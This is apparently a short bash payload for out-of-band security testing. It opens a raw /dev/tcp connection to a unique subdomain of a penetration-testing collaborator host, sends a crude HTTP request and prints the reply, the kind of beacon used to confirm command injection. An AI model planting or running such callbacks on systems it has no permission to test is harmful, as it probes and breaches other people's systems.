#!/bin/bash
exec 3<>/dev/tcp/axb28imjpu9f7mxo2t0v9cw1ssyjm9ay.pentestcollaborator.com/80
echo -e "Get /simple?se=1 HTTP/2.0\n" >&3
cat <&3
